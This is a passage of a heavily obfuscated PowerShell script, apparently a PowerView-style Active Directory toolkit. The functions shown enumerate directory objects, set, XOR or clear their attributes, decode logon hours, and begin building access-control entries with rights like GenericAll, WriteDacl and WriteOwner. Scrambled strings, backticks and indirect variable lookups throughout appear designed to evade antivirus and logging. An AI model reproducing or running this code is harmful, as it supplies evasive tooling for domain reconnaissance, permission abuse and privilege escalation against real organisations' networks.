        [Parameter(Position = 0, vaLUefroMpIPeliNe = ${t`RUE}, valUefRoMpIPeLInEByPRoPerTyNaME = ${tR`Ue})]
        [Alias({"{2}{5}{4}{0}{3}{1}" -f 'ishedNa','e','Di','m','ngu','sti'}, {"{3}{2}{1}{0}" -f'me','a','ccountN','SamA'}, {"{0}{1}"-f 'Nam','e'}, {"{4}{0}{2}{1}{3}"-f 'st','hedN','inguis','ame','MemberDi'}, {"{1}{2}{0}" -f'erName','Mem','b'})]
        [String[]]
        ${IdEN`T`I`TY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${doM`AIn},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f 'Filt','er'})]
        [String]
        ${LdAP`Fil`TeR},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${P`R`OPERtIeS},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{1}" -f'ADSP','h','at'})]
        [String]
        ${SeaR`ch`BasE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{0}{1}{3}" -f'omainCo','ntrol','D','ler'})]
        [String]
        ${SE`RveR},

        [ValidateSet({"{0}{1}"-f'Bas','e'}, {"{1}{2}{0}"-f 'el','OneL','ev'}, {"{1}{0}"-f 'btree','Su'})]
        [String]
        ${SEarc`HSCo`Pe} = ("{2}{1}{0}" -f'ee','btr','Su'),

        [ValidateRange(1, 10000)]
        [Int]
        ${R`ESU`Lt`pAGESiZe} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${s`eRV`e`RTImEl`ImiT},

        [Switch]
        ${tOMB`STo`Ne},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`R`Ed`ENTiAl} =   $21gV7e::"e`mPTy",

        [Switch]
        ${R`AW}
    )

    BEGIN {
        ${se`ArC`her`Ar`g`UMeNts} = @{
            ("{1}{0}{2}{3}"-f 'r','Prope','ti','es')    =   ("{2}{3}{1}{0}"-f'ta','a','msds-replvalu','emetad'),("{3}{0}{2}{1}"-f'ng','name','uished','disti')
            'Raw'           =   ${T`RUe}
        }
        if (${Ps`BouND`PaRA`MeT`ERs}[("{1}{0}" -f'omain','D')]) { ${SeArcheRAR`gU`men`Ts}[("{1}{0}"-f 'main','Do')] = ${DoMa`In} }
        if (${p`S`Bo`UndPaRameT`erS}[("{1}{0}{3}{2}"-f'i','LDAPF','er','lt')]) { ${sEArCH`e`RaRgU`MEnTS}[("{1}{0}{3}{2}" -f 'F','LDAP','er','ilt')] = ${l`da`PfILTEr} }
        if (${pSB`OUndPAr`A`met`ERS}[("{1}{0}{2}"-f'rc','Sea','hBase')]) { ${SE`ArC`Her`A`RGuMe`Nts}[("{2}{1}{0}" -f 'ase','archB','Se')] = ${SeaRC`H`B`AsE} }
        if (${psb`OunDp`A`RametE`Rs}[("{0}{1}" -f'S','erver')]) { ${SeAr`cHEr`ArG`UmENts}[("{0}{1}" -f 'S','erver')] = ${SEr`V`Er} }
        if (${P`S`BOU`NDparA`MeTe`Rs}[("{1}{2}{0}" -f 'ope','Search','Sc')]) { ${SeArcheR`ARg`U`M`eNtS}[("{1}{0}{2}" -f'chScop','Sear','e')] = ${s`E`A`RcHSCope} }
        if (${psBou`NdpaRaME`Te`RS}[("{4}{2}{0}{1}{3}"-f 'u','l','s','tPageSize','Re')]) { ${SeARCHE`RAR`g`U`ME`NTS}[("{0}{1}{2}"-f'Re','sul','tPageSize')] = ${re`su`LtpAg`eSIZE} }
        if (${PSbOU`N`DpaRaM`etERs}[("{2}{1}{0}"-f'mit','i','ServerTimeL')]) { ${searc`hera`RGU`MEN`TS}[("{0}{3}{2}{4}{1}" -f'S','t','eLim','erverTim','i')] = ${S`eRV`E`Rt`imeLimIt} }
        if (${PsB`OUndp`Ar`AMe`TErs}[("{0}{1}" -f 'Tom','bstone')]) { ${SeAR`CHeR`ARGu`mENtS}[("{0}{1}{2}" -f 'T','ombsto','ne')] = ${T`OMbst`OnE} }
        if (${PsbOUNd`pAR`Ame`T`ErS}[("{1}{2}{0}{3}"-f 'nti','Cr','ede','al')]) { ${sEAR`c`Her`Ar`GU`MeNtS}[("{3}{1}{0}{2}" -f 'entia','d','l','Cre')] = ${c`RedE`NTi`AL} }

        if (${pSBo`UnDp`A`Ra`mETeRS}[("{2}{0}{1}"-f'rt','ies','Prope')]) {
            ${ProPeR`Ty`F`ILTEr} = ${pS`BO`UnD`pARAMETE`RS}[("{0}{1}{2}" -f 'Prope','r','ties')] -Join '|'
        }
        else {
            ${PROpE`Rt`Y`FIlTer} = ''
        }
    }

    PROCESS {
        if (${p`Sb`OU`NDPaRAmE`T`ERS}[("{0}{2}{1}"-f 'Identi','y','t')]) { ${SE`ArCheraR`g`UMeNTS}[("{2}{0}{1}" -f'de','ntity','I')] = ${I`DENtiTY} }

        &("{0}{4}{2}{1}{3}"-f 'G','c','-DomainObje','t','et') @SearcherArguments | &("{0}{1}{3}{2}" -f 'For','Eac','ct','h-Obje') {
            ${o`B`J`eCtdN} = ${_}."P`Ro`pERTIES"[("{1}{5}{3}{0}{2}{4}"-f 'i','di','shed','tingu','name','s')][0]
            ForEach(${XMlN`oDe} in ${_}."P`RoP`ER`TIeS"[("{0}{2}{3}{1}{5}{4}{6}" -f'msd','e','s-','r','lvaluemeta','p','data')]) {
                ${Te`Mp`obJe`CT} = [xml]${X`mlNo`DE} | &("{3}{0}{2}{1}"-f 'lect-Obj','ct','e','Se') -ExpandProperty ("{1}{4}{0}{2}{3}" -f'_','DS_RE','VALUE_M','ETA_DATA','PL') -ErrorAction ("{1}{2}{0}{3}"-f 'inu','Silently','Cont','e')
                if (${TE`mPObJe`cT}) {
                    if (${TE`mpObjE`CT}."pSz`AT`TRIBuT`EnAME" -Match ${PrOP`eR`T`YfIl`TeR}) {
                        ${o`UTp`Ut} = &("{0}{2}{1}"-f 'Ne','bject','w-O') ("{0}{1}{2}" -f'PSObj','e','ct')
                        ${Out`PUt} | &("{1}{0}{2}{3}"-f'-','Add','Memb','er') ("{2}{3}{0}{1}" -f 'rop','erty','N','oteP') ("{1}{2}{0}" -f'tDN','Obje','c') ${objEC`T`DN}
                        ${Ou`TP`UT} | &("{1}{2}{0}" -f'r','Add-M','embe') ("{3}{1}{2}{0}" -f'ty','pe','r','NotePro') ("{2}{1}{3}{0}"-f 'eName','ttr','A','ibut') ${teMPO`B`jE`cT}."pSZa`T`Trib`U`TEN`Ame"
                        ${OUTP`Ut} | &("{3}{1}{2}{0}"-f'Member','d','-','Ad') ("{0}{1}{2}"-f'NotePro','per','ty') ("{0}{1}{2}{3}{4}"-f 'Attribu','teV','a','lu','e') ${TEMpO`BJ`e`ct}."p`sZoB`ject`Dn"
                        ${OU`TPuT} | &("{3}{2}{1}{0}" -f 'r','be','-Mem','Add') ("{1}{2}{0}" -f'y','Not','ePropert') ("{2}{0}{1}"-f 'eCreate','d','Tim') ${tEM`poB`Je`ct}."ftimeC`Re`AtED"
                        ${OU`Tp`Ut} | &("{1}{2}{0}"-f'r','Add-Mem','be') ("{1}{2}{3}{0}"-f'ty','No','tePrope','r') ("{1}{3}{0}{2}" -f'Dele','T','ted','ime') ${t`EM`PoBJect}."FTim`e`DeLeteD"
                        ${o`UT`Put} | &("{2}{1}{0}" -f 'r','be','Add-Mem') ("{1}{2}{0}" -f 'y','NotePrope','rt') ("{0}{3}{2}{1}"-f 'L','nge','ginatingCha','astOri') ${T`EMp`ObJE`ct}."fTIM`ELA`St`Origin`AtIngChANge"
                        ${Ou`TP`UT} | &("{1}{2}{3}{0}"-f'er','Ad','d-Mem','b') ("{0}{2}{1}{3}"-f 'No','ePro','t','perty') ("{1}{2}{0}" -f 'rsion','V','e') ${tempO`B`Ject}."D`WVErSi`on"
                        ${OuTp`Ut} | &("{3}{2}{0}{1}"-f'-Mem','ber','d','Ad') ("{0}{2}{1}" -f 'NotePr','perty','o') ("{3}{5}{0}{1}{2}{4}" -f 'tOrigina','t','ingDs','La','aDN','s') ${T`empo`B`JeCt}."pszLa`s`T`ORig`ina`T`INgdsADN"
                        ${o`UtPuT}."P`SOBJE`CT"."TY`PeNA`MES".("{1}{0}" -f'nsert','I').Invoke(0, ("{6}{4}{1}{3}{7}{5}{10}{8}{0}{2}{9}" -f'e','je','H','c','ew.ADOb','i','PowerVi','tL','ibut','istory','nkedAttr'))
                        ${o`UT`Put}
                    }
                }
                else {
                    &("{0}{2}{3}{1}" -f 'Write-Ve','e','r','bos') ('[Ge'+'t-Domai'+'nObjectLinkedAt'+'t'+'ributeHi'+'st'+'o'+'ry] '+'Er'+'ro'+'r '+'re'+'triev'+'ing '+(('Uj'+'Fmsds-replval'+'uemetada'+'ta'+'UjF ') -crEPlAcE  ([ChaR]85+[ChaR]106+[ChaR]70),[ChaR]39)+'for'+' '+"'$ObjectDN'")
                }
            }
        }
    }
}


function s`e`T-D`OMaINObj`E`cT {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{8}{11}{10}{7}{5}{3}{4}{2}{0}{9}{1}{6}" -f'gi','gFunct','n','sFo','rStateCha','oces','ions','dPr','PSUs','n','ul','eSho'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{1}{0}{2}" -f'houldPro','SS','cess','P'}, '')]
    [CmdletBinding()]
    Param(
        [Parameter(PosItIOn = 0, MaNdatORy = ${t`Rue}, VaLUefrOMPIPeLINE = ${tr`UE}, VAlUeFromPIPelineBYPRoPERTynaME = ${t`RUe})]
        [Alias({"{3}{2}{1}{0}"-f'ame','uishedN','ting','Dis'}, {"{3}{2}{1}{0}"-f'e','m','AccountNa','Sam'}, {"{1}{0}" -f'e','Nam'})]
        [String[]]
        ${i`DenT`itY},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}"-f'Rep','lace'})]
        [Hashtable]
        ${s`ET},

        [ValidateNotNullOrEmpty()]
        [Hashtable]
        ${X`Or},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${C`lE`Ar},

        [ValidateNotNullOrEmpty()]
        [String]
        ${D`O`MaiN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f'Filt','er'})]
        [String]
        ${LdAPf`IlT`Er},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{0}"-f'ath','DSP','A'})]
        [String]
        ${sEA`RcH`Ba`se},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}{2}{3}"-f'Do','mai','nContro','ller'})]
        [String]
        ${SErv`Er},

        [ValidateSet({"{0}{1}" -f'Bas','e'}, {"{0}{2}{1}"-f'O','eLevel','n'}, {"{0}{1}{2}" -f 'Su','btr','ee'})]
        [String]
        ${sE`AR`ChSCoPE} = ("{2}{1}{0}" -f 'ee','r','Subt'),

        [ValidateRange(1, 10000)]
        [Int]
        ${reSu`LTpag`e`SIZe} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${S`eRVE`Rt`imELi`m`it},

        [Switch]
        ${t`O`mBST`oNE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CRE`D`En`TIAl} =  ( chilDiTem  ('vAriA'+'bLe:21'+'gV'+'7E') ).VAlUe::"EMP`Ty"
    )

    BEGIN {
        ${SEARcHE`RARGUmE`N`Ts} = @{'Raw' = ${Tr`UE}}
        if (${psb`O`UndPAra`M`E`TERs}[("{1}{2}{0}" -f 'n','Dom','ai')]) { ${seA`RCH`e`RAr`GuMe`Nts}[("{1}{0}" -f'ain','Dom')] = ${D`omain} }
        if (${P`SBOUNd`P`AR`AMEtErs}[("{2}{3}{1}{0}" -f 'er','Filt','L','DAP')]) { ${seARc`HeRARGu`ME`NtS}[("{0}{2}{1}" -f 'LD','PFilter','A')] = ${LdaPFI`LT`er} }
        if (${PSb`oUNdp`AR`AMEt`ERS}[("{2}{0}{1}{3}"-f 'earchB','a','S','se')]) { ${se`A`RC`h`erargUMeNts}[("{0}{2}{1}" -f'Sea','e','rchBas')] = ${s`e`ArcH`BaSE} }
        if (${ps`B`oUNd`parA`MeTErS}[("{1}{0}" -f 'ver','Ser')]) { ${SEAR`CH`e`R`ARgumENTS}[("{0}{1}"-f'Serve','r')] = ${SE`RV`eR} }
        if (${Ps`B`OuNdPaRaMEte`RS}[("{2}{1}{3}{0}" -f'hScope','ar','Se','c')]) { ${SeA`RChe`RA`R`GumE`Nts}[("{2}{0}{1}"-f'chS','cope','Sear')] = ${S`E`ArCH`scOPE} }
        if (${pS`BO`UNDpAR`A`m`EteRS}[("{3}{4}{0}{1}{2}"-f'ltPage','Si','ze','Re','su')]) { ${SE`A`RcH`ERArGUM`EnTS}[("{2}{0}{3}{1}" -f 'ltPa','eSize','Resu','g')] = ${rE`sulT`PAG`Es`iZE} }
        if (${ps`BOu`Nd`p`AraMetErs}[("{3}{0}{2}{1}" -f'rTim','Limit','e','Serve')]) { ${SeA`RchERA`Rgum`e`NTs}[("{1}{2}{0}{3}"-f 'Lim','S','erverTime','it')] = ${sE`RvERt`I`M`ElImiT} }
        if (${psb`OUnDpAR`Am`etERs}[("{0}{1}{2}"-f 'Tombsto','n','e')]) { ${SearcHeRaR`Gu`Me`Nts}[("{1}{2}{0}"-f'tone','Tomb','s')] = ${tO`mB`STone} }
        if (${pS`B`OUNd`paraM`EtERs}[("{1}{2}{0}" -f 'ential','Cr','ed')]) { ${seArCHERA`R`GUME`N`Ts}[("{2}{0}{1}" -f'ia','l','Credent')] = ${crE`D`EnTIaL} }
    }

    PROCESS {
        if (${Psbo`Und`pAR`A`mETers}[("{1}{2}{0}" -f 'ntity','Id','e')]) { ${SE`A`RC`heRARguMeNts}[("{2}{0}{1}" -f'denti','ty','I')] = ${iD`enti`TY} }

        
        ${Raw`Ob`jEcT} = &("{1}{2}{3}{0}"-f 't','Ge','t-Domain','Objec') @SearcherArguments

        ForEach (${ob`je`CT} in ${r`A`WObJ`ecT}) {

            ${e`NTry} = ${Rawobj`e`ct}.("{0}{4}{3}{2}{1}"-f'Ge','try','n','E','tDirectory').Invoke()

            if(${PSBOUN`dpAra`mE`T`Ers}['Set']) {
                try {
                    ${PsBoun`dp`A`Rame`Te`RS}['Set'].("{0}{1}{2}" -f 'GetEnumer','a','tor').Invoke() | &("{0}{2}{1}"-f'ForE','ject','ach-Ob') {
                        &("{0}{1}{4}{2}{3}"-f 'Write-V','e','b','ose','r') "[Set-DomainObject] Setting '$($_.Name)' to '$($_.Value)' for object '$($RawObject.Properties.samaccountname)' "
                        ${E`NTRy}.("{0}{1}"-f 'pu','t').Invoke(${_}."NA`Me", ${_}."va`LUe")
                    }
                    ${eNT`RY}.("{4}{0}{3}{1}{2}" -f 'mi','ge','s','tchan','com').Invoke()
                }
                catch {
                    &("{2}{0}{1}{3}{4}"-f 'i','t','Wr','e-','Warning') "[Set-DomainObject] Error setting/replacing properties for object '$($RawObject.Properties.samaccountname)' : $_ "
                }
            }
            if(${psBoUN`D`Par`AmETERs}['XOR']) {
                try {
                    ${psBO`UndP`AraMet`Ers}['XOR'].("{0}{1}{2}"-f 'Ge','tEnum','erator').Invoke() | &("{1}{0}{3}{2}"-f 'ch-Ob','ForEa','ct','je') {
                        ${proP`ER`Tyn`AmE} = ${_}."nA`Me"
                        ${pro`PEr`TYXORvaL`Ue} = ${_}."v`ALUe"
                        &("{2}{3}{1}{0}"-f'se','o','Write-','Verb') "[Set-DomainObject] XORing '$PropertyName' with '$PropertyXorValue' for object '$($RawObject.Properties.samaccountname)' "
                        ${tYP`ENA`ME} = ${EN`T`Ry}.${pro`P`ertYNa`mE}[0].("{0}{1}"-f 'Ge','tType').Invoke()."N`Ame"

                        
                        ${P`ROPEr`TYV`AL`Ue} = $(${enT`RY}.${prOpE`R`Ty`NAMe}) -bxor ${prOPErT`yxo`R`V`ALUE}
                        ${e`NtRY}.${PR`opE`R`TYN`AmE} = ${P`R`oPERty`VaL`Ue} -as ${t`ypE`N`AmE}
                    }
                    ${eNt`RY}.("{3}{0}{2}{1}" -f 'mm','ges','itchan','co').Invoke()
                }
                catch {
                    &("{0}{1}{2}" -f 'Writ','e','-Warning') "[Set-DomainObject] Error XOR'ing properties for object '$($RawObject.Properties.samaccountname)' : $_ "
                }
            }
            if(${PsBOunDpA`RaME`Te`RS}[("{0}{1}"-f'Cl','ear')]) {
                try {
                    ${pSb`OU`NDPARamETe`RS}[("{0}{1}" -f 'Clea','r')] | &("{2}{4}{3}{1}{0}" -f 'ject','b','Fo','ach-O','rE') {
                        ${P`RO`pert`YNaME} = ${_}
                        &("{2}{1}{0}{3}"-f 'Verbo','ite-','Wr','se') "[Set-DomainObject] Clearing '$PropertyName' for object '$($RawObject.Properties.samaccountname)' "
                        ${en`T`RY}.${pR`OPERtY`NAme}.("{1}{0}"-f 'r','clea').Invoke()
                    }
                    ${e`NTRY}.("{2}{1}{0}"-f'es','hang','commitc').Invoke()
                }
                catch {
                    &("{0}{1}{2}" -f'Writ','e-W','arning') "[Set-DomainObject] Error clearing properties for object '$($RawObject.Properties.samaccountname)' : $_ "
                }
            }
        }
    }
}


function c`oNV`eRtFrOm-Ld`Ap`lOgOnhours {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{8}{9}{7}{3}{2}{6}{1}{4}{10}{5}" -f 'PS','T','edVarsM','lar','han','nts','ore','ec','Use','D','Assignme'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{1}{3}{2}" -f'PS','Shou','rocess','ldP'}, '')]
    [OutputType({"{4}{5}{6}{0}{2}{3}{1}"-f 'L','nHours','og','o','Pow','erView','.'})]
    [CmdletBinding()]
    Param (
        [Parameter( valuEfrOmPiPElInE = ${t`RuE}, vALuEFRoMPIPELINEbYprOpERTyName = ${t`RUe})]
        [ValidateNotNullOrEmpty()]
        [byte[]]
        ${LogoNHou`R`s`A`RrAy}
    )

    Begin {
        if(${lo`g`OnhoUR`sarr`AY}."C`OuNt" -ne 21) {
            throw ("{0}{2}{6}{7}{5}{4}{1}{3}" -f'L','t l','ogo','ength','ncorrec','the i','nHours','Array is ')
        }

        function CO`Nver`TTo-l`og`o`NHoU`RsaRray {
            Param (
                [int[]]
                ${HOuRs`ArR}
            )

            ${LOGoNH`ou`Rs} = &("{0}{1}{2}"-f 'New-','Objec','t') ("{1}{0}"-f'[]','bool') 24
            for(${i}=0; ${i} -lt 3; ${i}++) {
                ${B`yTe} = ${HoU`R`sArR}[${i}]
                ${oF`FSet} = ${I} * 8
                ${s`TR} =  (GCI vaRIAblE:I92 ).VAlUE::("{2}{1}{0}" -f 'ng','tri','ToS').Invoke(${b`yte},2).("{1}{2}{0}" -f 't','Pa','dLef').Invoke(8,'0')

                ${Lo`gON`houRs}[${o`F`FSEt}+0] = [bool]   (VaRiABLe ('I'+'92')  ).vaLue::"toiN`T`32"([string]${s`TR}[7])
                ${loGonh`o`URs}[${of`F`set}+1] = [bool]   (GET-VAriaBLe ("i9"+"2") -vaLUEO )::"tOI`NT32"([string]${s`TR}[6])
                ${L`ogo`NHOU`Rs}[${of`FsEt}+2] = [bool]  (  ITEM VaRiaBLe:I92  ).vALUE::"T`OI`NT32"([string]${S`TR}[5])
                ${L`ogONh`o`UrS}[${Of`Fset}+3] = [bool]   (gcI ('VAr'+'IAblE:'+'i92')).vAlUe::"toI`Nt`32"([string]${S`TR}[4])
                ${LoG`o`NhO`URs}[${O`Ffs`Et}+4] = [bool]   (VaRiaBLE  ("i9"+"2")).valUe::"to`Int32"([string]${S`Tr}[3])
                ${l`O`goNHOuRs}[${Off`SeT}+5] = [bool]   (  GeT-CHildiTEm  ("VaRiABLe:i"+"9"+"2") ).vALUE::"toIn`T`32"([string]${s`Tr}[2])
                ${L`OGonh`ou`Rs}[${oFF`Set}+6] = [bool]  ( Get-vaRiabLE ('I'+'92')  -VaLuEOnlY  )::"tO`I`Nt32"([string]${S`Tr}[1])
                ${L`O`GoNh`Ours}[${o`F`FsET}+7] = [bool]  (GeT-VarIABlE  I92 -vaLU  )::"toi`N`T32"([string]${S`TR}[0])
            }

            ${L`oGOnH`o`URS}
        }
    }

    Process {
        ${Ou`T`Put} = @{
            ("{1}{0}" -f 'ay','Sund') = &("{2}{3}{1}{4}{0}" -f'HoursArray','tTo-Logo','Con','ver','n') -HoursArr ${lOG`on`Ho`URs`ArRay}[0..2]
            ("{2}{0}{1}"-f 'on','day','M') = &("{4}{3}{5}{1}{6}{0}{7}{2}" -f 'gonHoursArr','ver','y','o','C','n','tTo-Lo','a') -HoursArr ${LOGO`Nho`UrSAR`Ray}[3..5]
            ("{0}{1}" -f 'Tues','day') = &("{2}{0}{7}{4}{5}{6}{3}{1}"-f'onvertTo-','rray','C','rsA','n','H','ou','Logo') -HoursArr ${lOgO`NHO`Ur`saRrAY}[6..8]
            ("{1}{0}{2}" -f 'nes','Wed','day') = &("{5}{2}{1}{4}{3}{6}{0}" -f'y','Logo','nvertTo-','urs','nHo','Co','Arra') -HoursArr ${LO`gonH`ouRsaR`R`Ay}[9..11]
            ("{1}{0}" -f'hurs','T') = &("{0}{5}{4}{1}{3}{2}{6}"-f'Conve','rs','r','A','ou','rtTo-LogonH','ray') -HoursArr ${lOg`o`NHOU`RSarRay}[12..14]
            ("{0}{1}" -f 'Fri','day') = &("{0}{2}{5}{4}{3}{1}" -f 'Conve','Array','r','s','LogonHour','tTo-') -HoursArr ${l`OGonh`O`U`RSaR`RAY}[15..17]
            ("{2}{0}{1}"-f 'urda','y','Sat') = &("{0}{5}{3}{6}{2}{4}{1}" -f 'Conve','ay','nHoursA','Lo','rr','rtTo-','go') -HoursArr ${L`O`go`NHOuRSA`RRay}[18..20]
        }

        ${ouT`P`UT} = &("{0}{2}{1}{3}"-f 'New','j','-Ob','ect') ("{1}{2}{0}"-f'ject','P','SOb') -Property ${ouTp`Ut}
        ${ou`TpUt}."pS`oBjEcT"."typEn`A`MeS".("{1}{0}{2}" -f 'r','Inse','t').Invoke(0, ("{2}{3}{1}{0}"-f'ours','w.LogonH','Pow','erVie'))
        ${o`UTp`UT}
    }
}


function NeW`-aD`objec`TAcCeSSCOn`Trol`E`Ntry {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{1}{6}{2}{4}{7}{5}{3}{8}"-f'PSUse','S','at','Funct','eCha','ging','houldProcessForSt','n','ions'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{3}{2}{0}"-f 'cess','PSShould','ro','P'}, '')]
    [OutputType({"{8}{7}{4}{0}{2}{1}{3}{6}{10}{9}{5}" -f'ecu','ity.Acce','r','s','tem.S','le','s','s','Sy','orizationRu','Control.Auth'})]
    [CmdletBinding()]
    Param (
        [Parameter(posItiOn = 0, valuEFRoMPiPeLinE = ${T`RUe}, VALuEfrOmpiPeliNEBYProPERtyNAme = ${Tr`Ue}, mandatORy = ${t`RUE})]
        [Alias({"{1}{3}{2}{0}"-f'dName','Disti','ishe','ngu'}, {"{2}{4}{0}{3}{1}"-f'Accoun','ame','Sa','tN','m'}, {"{1}{0}" -f 'e','Nam'})]
        [String]
        ${prINcI`PalID`eN`TitY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${PRIn`cipa`lDoM`AiN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{4}{0}{2}{5}{1}"-f'mainContr','r','oll','D','o','e'})]
        [String]
        ${SERv`er},

        [ValidateSet({"{0}{1}"-f 'Ba','se'}, {"{0}{2}{1}"-f 'On','el','eLev'}, {"{0}{1}"-f'Subtre','e'})]
        [String]
        ${sEAR`c`hScoPE} = ("{1}{2}{0}" -f 'ee','Su','btr'),

        [ValidateRange(1, 10000)]
        [Int]
        ${ReS`U`LTpAGEsI`zE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SerVe`RtIM`elim`it},

        [Switch]
        ${TO`MbS`TO`Ne},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CReDeN`T`I`AL} =  (VariaBle  21GV7e ).vaLuE::"Em`PtY",

        [Parameter(mAnDATOry = ${TR`UE})]
        [ValidateSet({"{5}{1}{0}{4}{3}{2}" -f 'stemS','ssSy','y','urit','ec','Acce'}, {"{1}{2}{0}"-f 'ld','C','reateChi'},{"{1}{0}{2}" -f'et','Del','e'},{"{3}{1}{0}{2}" -f'i','eCh','ld','Delet'},{"{1}{0}{2}" -f 'eTr','Delet','ee'},{"{1}{0}{2}" -f 'xtendedRi','E','ght'},{"{2}{1}{0}" -f'ericAll','en','G'},{"{3}{0}{2}{1}" -f 'e','ericExecute','n','G'},{"{1}{3}{2}{0}" -f 'd','Gener','ea','icR'},{"{1}{0}{2}" -f'r','Gene','icWrite'},{"{1}{0}{3}{2}" -f'i','ListCh','ren','ld'},{"{1}{0}{3}{2}"-f'tOb','Lis','t','jec'},{"{0}{2}{1}{3}" -f 'ReadCon','r','t','ol'},{"{0}{2}{1}" -f 'Re','dProperty','a'},{"{0}{1}" -f'Sel','f'},{"{1}{2}{0}" -f'e','Synchroni','z'},{"{0}{1}"-f'Write','Dacl'},{"{3}{1}{2}{0}" -f'wner','r','iteO','W'},{"{1}{2}{0}" -f 'operty','Wr','itePr'})]
        ${R`IgHt},

        [Parameter(manDAtOrY = ${Tr`UE}, PAraMeteRSEtnAmE="AC`C`Ess`RU`lEtyPe")]
        [ValidateSet({"{0}{1}"-f'All','ow'}, {"{1}{0}"-f'eny','D'})]
        [String[]]
        ${A`c`CesscO`NTRolT`YPe},

        [Parameter(MAndaTOry = ${t`Rue}, PaRaMeTErSeTnAME="au`D`iTruLetypE")]
        [ValidateSet({"{1}{2}{0}"-f 's','Suc','ces'}, {"{2}{0}{1}"-f 'ailur','e','F'})]
        [String]
        ${a`Ud`itFLag},

        [Parameter(MaNDaTory = ${faL`Se}, pARAmetErSeTnAME="accEs`SrULet`YPE")]
        [Parameter(mandaTORY = ${f`AlsE}, PArAmETERsetnAMe="A`UDI`TruL`EtYPe")]
        [Parameter(maNDAtOry = ${FA`Lse}, PAraMETerSETNaMe="obJEctgu`id`looKuP")]
        [Guid]
        ${OB`j`EC`TtyPE},

        [ValidateSet('All', {"{0}{1}"-f'C','hildren'},{"{2}{0}{1}" -f 'escende','nts','D'},{"{1}{0}"-f 'one','N'},{"{1}{0}{2}{3}"-f'l','Se','fAn','dChildren'})]
        [String]
        ${i`NHerIt`ANCET`yPe},

        [Guid]
        ${InHE`RitED`ObjECTty`Pe}
    )

    Begin {
        if (${PRIn`c`i`P`AL`IdenTITy} -notmatch ("{0}{1}"-f'^S','-1-.*')) {
            ${prI`NCIpAlseAR`ChEr`ARg`Um`EN`Ts} = @{
                ("{2}{1}{0}" -f'ty','i','Ident') = ${pr`In`cIpA`LI`dEntiTy}
                ("{2}{0}{1}"-f 'rtie','s','Prope') = ("{0}{3}{1}{4}{2}"-f 'disting','hedn','tsid','uis','ame,objec')
            }
            if (${PSbOun`Dpara`M`e`TERs}[("{0}{1}{2}" -f 'Princip','al','Domain')]) { ${pR`i`NCiPA`LsEARC`H`EraRG`UMENTS}[("{2}{1}{0}" -f 'n','mai','Do')] = ${priN`Ci`pALDOMa`iN} }
            if (${pSbo`UnDpARa`Me`Te`RS}[("{1}{0}" -f 'rver','Se')]) { ${Pr`incipaLSEarc`H`E`RARG`U`MEnTS}[("{2}{0}{1}" -f'er','ver','S')] = ${s`Er`VER} }
            if (${psBOunDPara`m`E`TERs}[("{2}{1}{0}"-f 'Scope','ch','Sear')]) { ${prI`NciPa`LS`EARcheRAR`Gu`meN`Ts}[("{2}{1}{0}{3}" -f 'op','hSc','Searc','e')] = ${S`eARChSCo`pe} }
            if (${Psb`Ou`NDPAR`Am`eters}[("{2}{1}{0}"-f'ize','sultPageS','Re')]) { ${priN`CiPalsEArcH`E`Rar`GuMeN`TS}[("{1}{0}{2}"-f'ult','Res','PageSize')] = ${ReSUlTP`Ag`E`size} }
            if (${psBOu`N`DpARAMet`eRs}[("{3}{2}{1}{0}"-f 'it','erTimeLim','rv','Se')]) { ${PrI`NCipAlse`ArCHeR`ArG`U`MenTS}[("{0}{1}{2}{4}{3}" -f'Ser','verTim','eLi','it','m')] = ${s`er`VErtImE`LiMIT} }
            if (${PS`Bou`Ndparame`Te`RS}[("{0}{1}{2}" -f'Tombs','to','ne')]) { ${pRI`NciPA`LseaRch`ERaRgUme`NtS}[("{1}{0}"-f 'ombstone','T')] = ${To`mBSt`One} }
            if (${P`S`BOu`NDPAraMeteRs}[("{0}{1}{2}"-f'C','redentia','l')]) { ${PrINCIpal`s`Ea`RCHe`RAR`gU`Men`Ts}[("{0}{1}{2}" -f'Cr','eden','tial')] = ${cRE`D`eNTI`AL} }
            ${PR`i`NcipAL} = &("{3}{1}{2}{0}"-f'Object','o','main','Get-D') @PrincipalSearcherArguments
            if (-not ${PrI`N`CiP`Al}) {
                throw ('Unab'+'le '+'to'+' '+'re'+'so'+'lve '+'princ'+'i'+'pa'+'l: '+"$PrincipalIdentity")
            }
            elseif(${P`R`In`cIpaL}."CO`Unt" -gt 1) {
                throw ("{4}{9}{11}{2}{6}{8}{10}{5}{1}{7}{0}{12}{3}"-f'o','bje','palIdentit','d','Pri','o','y mat','cts, but ','ches mul','nc','tiple AD ','i','nly one is allowe')
            }
            ${ob`Jects`iD} = ${pRiNC`i`PaL}."OBj`eCt`sid"
        }
        else {
            ${Obje`CT`S`Id} = ${pr`inCIpaL`Id`En`TIty}
        }

        ${aDr`ight} = 0
        foreach(${R} in ${r`iGhT}) {
            ${ADR`igHT} = ${AD`RIg`ht} -bor (([System.DirectoryServices.ActiveDirectoryRights]${r})."v`Alue__")
        }
        ${a`Dri`GHt} = [System.DirectoryServices.ActiveDirectoryRights]${ad`Ri`GhT}

